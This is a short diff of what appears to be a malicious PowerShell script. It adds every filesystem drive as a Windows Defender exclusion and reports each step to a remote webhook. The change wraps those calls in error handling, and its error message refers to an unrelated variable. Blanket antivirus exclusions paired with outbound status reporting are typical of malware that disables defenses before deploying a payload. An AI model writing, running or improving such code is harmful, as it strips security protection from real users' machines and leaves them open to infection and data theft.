@@ -52,8 +52,12 @@ try {
 
     $drives = Get-PSDrive -PSProvider FileSystem | ForEach-Object { $_.Root }
     foreach ($drive in $drives) {
-        Add-MpPreference -ExclusionPath $drive -ErrorAction Stop | Out-Null
-         Send-WebhookMessage -Message "Added exclusion: $drive"
+        try {
+            Add-MpPreference -ExclusionPath $drive -ErrorAction Stop | Out-Null
+            Send-WebhookMessage -Message "Added exclusion: $drive"
+        } catch {
+            Send-WebhookMessage -Message "Error adding exclusion for ${tempFolder}: $_"
+        }
     }
 
     try {
